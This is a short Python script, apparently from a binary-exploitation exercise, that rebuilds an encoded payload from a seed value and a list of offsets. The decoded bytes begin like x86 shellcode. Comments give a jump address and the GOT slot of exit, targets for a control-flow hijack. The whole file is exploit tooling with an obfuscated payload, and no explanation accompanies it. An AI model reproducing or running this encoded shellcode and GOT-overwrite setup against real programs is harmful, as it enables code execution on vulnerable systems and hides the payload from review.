#!/usr/bin/env python
#enter 49 when prompted

offsets = [ 143, -55, 58, -19, -153, 182, -77, -79, 161, -128, 22, 6, -63, 68, -11, 0, -57, 0, 51, 7, 32, 90, -145, 1, 54, 88, -84, -75, -55, 194, -77, ]

beg = chr(int(input("Enter seed: ")))
sc = beg
cur = ord(beg)
for i in offsets:
    cur = cur + i
    sc += chr(cur)
print(sc)

#0x0804f1d6
#0804a014 R_386_JUMP_SLOT   exit@GLIBC_2.0
